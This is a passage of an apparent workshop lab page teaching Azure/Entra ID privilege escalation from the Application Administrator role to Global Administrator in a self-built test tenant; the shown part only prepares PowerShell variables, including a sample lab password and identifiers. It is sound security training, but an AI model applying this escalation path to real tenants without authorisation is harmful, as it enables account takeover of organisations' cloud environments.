
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Electronice Workbook (EWB) For AuCert 2024 Workshop">
      
      
        <meta name="author" content="Greg Scheidel">
      
      
        <link rel="canonical" href="https://auscert2024.scheidel.net/a4/sec530.bonus.a4/">
      
      
        <link rel="prev" href="../../a3/sec530.bonus.a3/">
      
      
        <link rel="next" href="../../a5/sec530.bonus.a5/">
      
      
      <link rel="icon" href="../../media/tools-indigo.svg">
      <meta name="generator" content="mkdocs-1.6.0, mkdocs-material-9.5.22">
    
    
      
        <title>Privilege Escalation - AusCERT 2024 - Security in an (Unmanaged) Azure Environment - A Practical Example</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.732c4fb1.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      
  
  
    
    
  
    
    
  
    
    
  
    
    
  
  
  <style>:root{--md-admonition-icon--abstract:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 9H7V7h10m0 6H7v-2h10m-3 6H7v-2h7M12 3a1 1 0 0 1 1 1 1 1 0 0 1-1 1 1 1 0 0 1-1-1 1 1 0 0 1 1-1m7 0h-4.18C14.4 1.84 13.3 1 12 1c-1.3 0-2.4.84-2.82 2H5a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V5a2 2 0 0 0-2-2Z"/></svg>');--md-admonition-icon--cmd:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 10h-2V8h2m0 5h-2v-2h2m-3-1h-2V8h2m0 5h-2v-2h2m0 6H8v-2h8m-9-5H5V8h2m0 5H5v-2h2m1 0h2v2H8m0-5h2v2H8m3 1h2v2h-2m0-5h2v2h-2m9-5H4c-1.11 0-2 .89-2 2v10a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2Z"/></svg>');--md-admonition-icon--example:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M11 15h6v2h-6v-2M9 7H7v2h2V7m2 6h6v-2h-6v2m0-4h6V7h-6v2m-2 2H7v2h2v-2m12-6v14c0 1.1-.9 2-2 2H5c-1.1 0-2-.9-2-2V5c0-1.1.9-2 2-2h14c1.1 0 2 .9 2 2m-2 0H5v14h14V5M9 15H7v2h2v-2Z"/></svg>');--md-admonition-icon--reminder:url('data:image/svg+xml;charset=utf-8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M7.25 3c.65 0 1.25.21 1.75.56V3a2 2 0 0 1 2-2 2 2 0 0 1 2 2v.57c.5-.35 1.1-.57 1.75-.57a3 3 0 0 1 3 3c0 1.58-1.21 2.87-2.75 3h-2v1h1.24l.48.13 4.59 2.29c.82.31 1.22.92 1.22 1.83l-.03.14v.14l-1 6.75c-.06.47-.28.88-.66 1.22-.37.34-.79.5-1.26.5H10c-.55 0-1-.19-1.42-.59L2 15.84l1.05-1.07c.28-.27.64-.43 1.08-.43h.32l4.55.99V9H7a3.021 3.021 0 0 1-2.75-3 3 3 0 0 1 3-3M9 6a1.75 1.75 0 0 0-1.75-1.75A1.75 1.75 0 0 0 5.5 6c0 .88.65 1.61 1.5 1.73v.02h2V6m6 1.75v-.01c.85-.12 1.5-.85 1.5-1.74 0-.96-.78-1.74-1.75-1.74S13 5.04 13 6v1.75h2Z"/></svg>');}</style>



    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../stylesheets/extra.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#azure-privilege-escalation" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

<header class="md-header" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="AusCERT 2024 - Security in an (Unmanaged) Azure Environment - A Practical Example" class="md-header__button md-logo" aria-label="AusCERT 2024 - Security in an (Unmanaged) Azure Environment - A Practical Example" data-md-component="logo">
      
  <img src="../../media/tools.svg" alt="logo">

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            AusCERT 2024 - Security in an (Unmanaged) Azure Environment - A Practical Example
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Privilege Escalation
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6zm0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4zM7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
            
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../.." class="md-tabs__link">
        
  
    
  
  Home

      </a>
    </li>
  

      
        
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../../a1/sec530.bonus.a1/" class="md-tabs__link">
          
  
    
  
  Labs

        </a>
      </li>
    
  

      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../../info/" class="md-tabs__link">
        
  
    
  
  Additional Info

      </a>
    </li>
  

      
        
  
  
  
    <li class="md-tabs__item">
      <a href="../../contact/" class="md-tabs__link">
        
  
    
  
  Contact Info

      </a>
    </li>
  

      
    </ul>
  </div>
</nav>
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="AusCERT 2024 - Security in an (Unmanaged) Azure Environment - A Practical Example" class="md-nav__button md-logo" aria-label="AusCERT 2024 - Security in an (Unmanaged) Azure Environment - A Practical Example" data-md-component="logo">
      
  <img src="../../media/tools.svg" alt="logo">

    </a>
    AusCERT 2024 - Security in an (Unmanaged) Azure Environment - A Practical Example
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    
    
      
        
      
        
      
        
      
        
      
        
      
    
    
      
        
        
      
      
    
    
    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
            
  
  <span class="md-ellipsis">
    Labs
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Labs
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../a1/sec530.bonus.a1/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Account Setup
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../a2/sec530.bonus.a2/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Azure Environment Setup
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../a3/sec530.bonus.a3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Manual Reconnaissance
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
        
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Privilege Escalation
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Privilege Escalation
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#objectives" class="md-nav__link">
    <span class="md-ellipsis">
      Objectives
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lab-preparation" class="md-nav__link">
    <span class="md-ellipsis">
      Lab Preparation
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#step-by-step-instructions" class="md-nav__link">
    <span class="md-ellipsis">
      Step-by-Step Instructions
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Step-by-Step Instructions">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-prepare-powershell-environment" class="md-nav__link">
    <span class="md-ellipsis">
      1. Prepare PowerShell Environment
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-create-a-new-password-credential-for-a-pra-application" class="md-nav__link">
    <span class="md-ellipsis">
      2. Create a new password credential for a PRA application
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-login-as-the-pra-service-principal" class="md-nav__link">
    <span class="md-ellipsis">
      3. Login as the PRA Service Principal
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-connect-to-microsoft-entra-id-with-a-new-oauth-token" class="md-nav__link">
    <span class="md-ellipsis">
      4. Connect to Microsoft Entra ID with a New OAuth Token
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#5-escalate-privileges-to-global-administrator" class="md-nav__link">
    <span class="md-ellipsis">
      5. Escalate Privileges to Global Administrator
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#conclusion" class="md-nav__link">
    <span class="md-ellipsis">
      Conclusion
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../a5/sec530.bonus.a5/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Teardown
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../info/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Additional Info
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../contact/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Contact Info
  </span>
  

      </a>
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
    
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#objectives" class="md-nav__link">
    <span class="md-ellipsis">
      Objectives
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#introduction" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#lab-preparation" class="md-nav__link">
    <span class="md-ellipsis">
      Lab Preparation
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#step-by-step-instructions" class="md-nav__link">
    <span class="md-ellipsis">
      Step-by-Step Instructions
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Step-by-Step Instructions">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-prepare-powershell-environment" class="md-nav__link">
    <span class="md-ellipsis">
      1. Prepare PowerShell Environment
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-create-a-new-password-credential-for-a-pra-application" class="md-nav__link">
    <span class="md-ellipsis">
      2. Create a new password credential for a PRA application
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-login-as-the-pra-service-principal" class="md-nav__link">
    <span class="md-ellipsis">
      3. Login as the PRA Service Principal
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-connect-to-microsoft-entra-id-with-a-new-oauth-token" class="md-nav__link">
    <span class="md-ellipsis">
      4. Connect to Microsoft Entra ID with a New OAuth Token
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#5-escalate-privileges-to-global-administrator" class="md-nav__link">
    <span class="md-ellipsis">
      5. Escalate Privileges to Global Administrator
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#conclusion" class="md-nav__link">
    <span class="md-ellipsis">
      Conclusion
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


<h1 id="azure-privilege-escalation">Azure Privilege Escalation</h1>
<h2 id="objectives">Objectives</h2>
<ul>
<li>Demonstrate that the Application Administrator role can lead to privilege escalation.</li>
<li>Leverage initial privilege escalation to escalate to Global Administrator.</li>
</ul>
<h2 id="introduction">Introduction</h2>
<p>Now that you've identified an Microsoft Entra ID user account and application that have elevated privileges, we'll test whether a privilege escalation attack could allow an attacker or developer to assume excessive privileges, up to and including Global Administrator!</p>
<p>We will again use PowerShell commands to manually perform this test. If all goes well, you'll be able to show the Tyrell Corp developers and CISO that the developers have introduced significant risk into the environment with over-privileged role assignments.</p>
<h2 id="lab-preparation">Lab Preparation</h2>
<p>Before starting this lab, you must have already completed the <a href="../../a3/sec530.bonus.a3/" rel="noopener" target="_blank">Azure Manual Reconnaissance</a> lab.</p>
<div class="admonition reminder">
<p class="admonition-title">Current State</p>
<p>At this point, you should:</p>
<ul>
<li>
<p>Be logged into <a href="https://portal.azure.com" rel="noopener" target="_blank">https://portal.azure.com</a> with your Azure account.</p>
</li>
<li>
<p>Have created <a href="../../a2/sec530.bonus.a2/" rel="noopener" target="_blank">the test Microsoft Entra ID environment</a> replicating Tyrell Corp's fictitious production environment.</p>
</li>
<li>
<p>Have <a href="../../a3/sec530.bonus.a3/#1-identify-non-privileged-account" rel="noopener" target="_blank">identified a non-privileged account</a> to use as the starting point for the privilege escalation attack.</p>
</li>
<li>
<p>Performed reconnaissance to gather information about the <a href="../../a3/sec530.bonus.a3/#4-enumerate-application-administrators" rel="noopener" target="_blank">Application Administrator role and user</a>, and the <a href="../../a3/sec530.bonus.a3/#5-enumerate-privileged-role-administrators" rel="noopener" target="_blank">Privileged Role Administrator (PRA) role and application</a>.</p>
</li>
<li>
<p>Have your own copy of the <a href="../../a1/sec530.bonus.a1/#7-open-azure-notes-workbook" rel="noopener" target="_blank">Azure-Notes workbook</a> open, recording information up to this point about your Azure account and Microsoft Entra ID environment.</p>
</li>
</ul>
</div>
<h2 id="step-by-step-instructions">Step-by-Step Instructions</h2>
<details class="example">
<summary>1. Prepare PowerShell Environment</summary>
<h3 class="hidden_element" id="1-prepare-powershell-environment">1. Prepare PowerShell Environment</h3>
<p>Let's use some of the values collected in the previous Azure labs to set PowerShell environment variables, that we will then use to perform the privilege escalation attack.</p>
<ol>
<li>
<p>Switch back to the browser tab accessing the Azure portal <a href="https://portal.azure.com" rel="noopener" target="_blank">https://portal.azure.com</a>.</p>
<div class="admonition cmd">
<p class="admonition-title">URL</p>
<div class="highlight"><pre><span></span><code>https://portal.azure.com
</code></pre></div>
</div>
</li>
<li>
<p>Start a Cloud Shell session with PowerShell as the terminal (as we did in <a href="../../a3/sec530.bonus.a3/#3-authenticate-to-azure" rel="noopener" target="_blank">the previous lab</a>).</p>
<p><strong>Click</strong> on the <strong>Cloud Shell</strong> icon at the top of the page, immediately to the right of the search bar.</p>
<p><img alt=" " class="noborder" src="../../media/azure-cloud-shell-open.png" /></p>
<details class="tip">
<summary>Maximizing the Shell</summary>
<p>You can maximize the shell by <strong>clicking</strong> on the 'maximize' icon near the top-right of the terminal window.</p>
<p><img alt=" " class="noborder" src="../../media/azure-cloud-shell-maximize.png" /></p>
</details>
</li>
<li>
<p><strong>If your current shell is bash</strong>, then switch to PowerShell.</p>
<p><strong>Click</strong> on the dropdown menu control in the top-left corner of the Cloud Shell terminal, currently displaying 'Bash'. Then <strong>click</strong> on <strong>PowerShell</strong> from the dropdown menu.</p>
<p><img alt=" " class="noborder" src="../../media/cloudshell-select-powershell.png" /></p>
<p>You will be presented with a "Switch to PowerShell in Cloud Shell" prompt. <strong>Click</strong> on the <strong>Confirm</strong> command button.</p>
<p><img alt=" " class="noborder" src="../../media/cloudshell-confirm-powershell.png" /></p>
</li>
<li>
<p>After a minute, your web browser tab will display a PowerShell terminal prompt.</p>
<p><img alt=" " class="noborder" src="../../media/azure-cloud-shell-powershell-prompt.png" /></p>
<div class="admonition note">
<p class="admonition-title">The standard Azure Cloud Shell prompt includes the account user name, and so will be different than the prompt in the screenshot above.</p>
</div>
</li>
<li>
<p>Part of our escalation attack will be to authenticate to Azure with the service principal of the Privileged Role Administrator (PRA). This will require that we have the application ID and object ID of the application assigned the PRA role.</p>
<p>In the <a href="../../a3/sec530.bonus.a3/#5-enumerate-privileged-role-administrators" rel="noopener" target="_blank">Azure Manual Reconnaissance lab</a>, we identified the application ID and object ID, set environment variables to those values, and recorded the values in the Azure-Notes workbook.</p>
<p>We can recreate that environment variables by copying commands from calculated cells in your Azure-Notes workbook.</p>
<p>Copy the contents of cells L20:L21.</p>
<p><img alt=" " class="noborder" src="../media/copy-appid-objectid-commands.png" /></p>
<p>Now paste the copied cells to your Cloud Shell terminal window.</p>
<p>Then execute the command below to verify that the values are set correctly:</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>${PRA_APPID}
${PRA_APP_OBJECTID}
</code></pre></div>
</div>
<p>Your output should look similar to the following:</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; $PRA_APPID=&#39;90f89545-3f20-4d8e-8cd6-747b6f8e890b&#39;

PS /home/sec530-labs-azure-sec530-labs-xp&gt; $PRA_APP_OBJECT_ID=&#39;b2bd0627-b9d7-48ec-80fb-4375592f8365&#39;

PS /home/sec530-labs-azure-sec530-labs-xp&gt; ${PRA_APPID}
90f89545-3f20-4d8e-8cd6-747b6f8e890b

PS /home/sec530-labs-azure-sec530-labs-xp&gt; ${PRA_APP_OBJECTID}
b2bd0627-b9d7-48ec-80fb-4375592f8365

PS /home/sec530-labs-azure-sec530-labs-xp&gt;
</code></pre></div>
</div>
</li>
<li>
<p>Next let's retrieve the universal principal name (UPN) of the user assigned the Application Administrator role.</p>
<p>This was set when Terraform created the test environment in the <a href="../../a2/sec530.bonus.a2/#7-execute-purplecloud-script" rel="noopener" target="_blank">Azure Environment Setup lab</a>, and validated in the <a href="../../a3/sec530.bonus.a3/#4-enumerate-application-administrators" rel="noopener" target="_blank">Azure Manual Reconnaissance lab</a> when we enumerated application administrator accounts.</p>
<p>We saved the elements that make up the UPN in the Azure-Notes workbook, and the full UPN is calculated for you as the 'Application Admin UPN'.</p>
<p>Copy the contents of cell L22 to copy a command that sets an environment variable containing the full UPN of the Application Administrator user.</p>
<p><img alt=" " class="noborder" src="../media/copy-app-admin-upn-command.png" /></p>
<p>Then execute the command below to display the variable's value:</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>${APP_ADMIN_UPN}
</code></pre></div>
</div>
<p>Your output should look similar to the following:</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; $APP_ADMIN_UPN=&#39;benjaminwaters@sansdevstudent79e4d10cee7f.onmicrosoft.com&#39;

PS /home/sec530-labs-azure-sec530-labs-xp&gt; ${APP_ADMIN_UPN}
benjaminwaters@sansdevstudent79e4d10cee7f.onmicrosoft.com

PS /home/sec530-labs-azure-sec530-labs-xp&gt;
</code></pre></div>
</div>
</li>
<li>
<p>We will also need the password for this user.</p>
<p>When Terraform created the test environment, the passwords for all user accounts were set to the same value. We saved this value to the Azure-Notes workbook, this time as the 'Random User Password'.</p>
<p>Copy the contents of cell L12 to copy a command that sets an environment variable containing the password.</p>
<p><img alt=" " class="noborder" src="../media/copy-plaintext-password-command.png" /></p>
<p>Then execute the command below to display the variable's value:</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>${PLAINTEXT_PASSWORD}
</code></pre></div>
</div>
<p>Your output should look similar to the following:</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; $PLAINTEXT_PASSWORD=&#39;amusing-parakeet-hSbg&#39;

PS /home/sec530-labs-azure-sec530-labs-xp&gt; ${PLAINTEXT_PASSWORD}
amusing-parakeet-hSbg

PS /home/sec530-labs-azure-sec530-labs-xp&gt;
</code></pre></div>
</div>
</li>
<li>
<p>Finally, we'll need the Microsoft Entra ID subscription's tenant ID. Execute the commands below to retrieve the tenant ID value, save the value to a variable, and display the variable's contents.</p>
<div class="admonition cmd">
<p class="admonition-title">Cloud Shell PowerShell Input</p>
<div class="highlight"><pre><span></span><code>$TENANT_ID=(Get-AzTenant).Id
${TENANT_ID}
</code></pre></div>
</div>
<p>Your output should be similar to the following:</p>
<div class="admonition abstract">
<p class="admonition-title">Cloud Shell PowerShell Output</p>
<div class="highlight"><pre><span></span><code>PS /home/sec530-labs-azure-sec530-labs-xp&gt; $TENANT_ID=(Get-AzTenant).Id

PS /home/sec530-labs-azure-sec530-labs-xp&gt; ${TENANT_ID}
f6edcda7-02bc-4daa-972d-15567f6e3bb6

PS /home/sec530-labs-azure-sec530-labs-xp
</code></pre></div>
</div>
<details class="tip">
<summary>Double-checking Against the Workbook</summary>
<p>We saved the tenant ID in the Azure-Notes workbook back in <a href="../../a1/sec530.bonus.a1/#8-record-subscription-and-tenant-ids" rel="noopener" target="_blank">Azure Account Setup</a>. You can double-check the value in the output above against the value saved in the workbook.</p>
</details>
</li>
</ol>
<details class="success">
<summary>You have now prepared the PowerShell environment to perform the privilege escalation attack.</summary>
<p>You set multiple environment variables based on information you previously collected.</p>
<table>
<thead>
<tr>
<th>Azure Information</th>
<th>Environment Variable</th>
</tr>
</thead>
<tbody>
<tr>
<td>Application ID of the application assigned the Privileged Role Administrator (PRA) role</td>
<td>PRA_APPID</td>
</tr>
<tr>
<td>Privileged Role Administrator (PRA) Application's Object ID</td>
<td>PRA_APP_OBJECTID</td>
</tr>
<tr>
<td>UPN of the user assigned the Application Administrator role</td>
<td>APP_ADMIN_UPN</td>
</tr>
<tr>
<td>Application Administrator user's password</td>
<td>PLAINTEXT_PASSWORD</td>
</tr>
<tr>
<td>Tenant ID</td>
<td>TENANT_ID</td>
</tr>
</tbody>
</table>
<p>We'll use these variables in the commands for our privilege escalation attack, to make the command execution easier and less error-prone.</p>
